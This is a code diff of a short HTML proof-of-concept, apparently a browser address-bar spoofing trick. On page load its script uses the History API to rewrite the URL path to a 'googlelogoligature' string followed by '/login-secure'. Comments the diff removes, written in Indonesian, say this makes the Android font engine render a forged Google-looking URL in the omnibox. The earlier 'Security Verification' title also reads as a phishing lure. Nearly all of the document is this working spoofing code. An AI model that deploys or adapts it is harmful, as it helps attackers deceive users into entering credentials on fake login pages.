@@ -3,7 +3,7 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Security Verification</title>
+    <title>pocpoc</title>
     <style>
       body {
         font-family: sans-serif;
@@ -18,21 +18,14 @@
     </style>
   </head>
   <body>
-    <h2>System Secure</h2>
+    <h2>pocpoc</h2>
     <p>Check your address bar right now.</p>
 
     <script>
-      // Kita menggunakan History API untuk memalsukan URL path
-      // Chrome mengizinkan ini selama masih di domain yang sama (ologoligature.github.io)
 
       window.onload = function () {
-        // String ajaib lu yang bikin engine font Android nge-glitch
         const magicString = "googlelogoligature";
-
-        // Kita inject string itu ke dalam URL secara instan
         const spoofedPath = "/" + magicString + "/login-secure";
-
-        // Eksekusi perubahan UI di Omnibox tanpa reload page
         window.history.replaceState(null, "", spoofedPath);
       };
     </script>
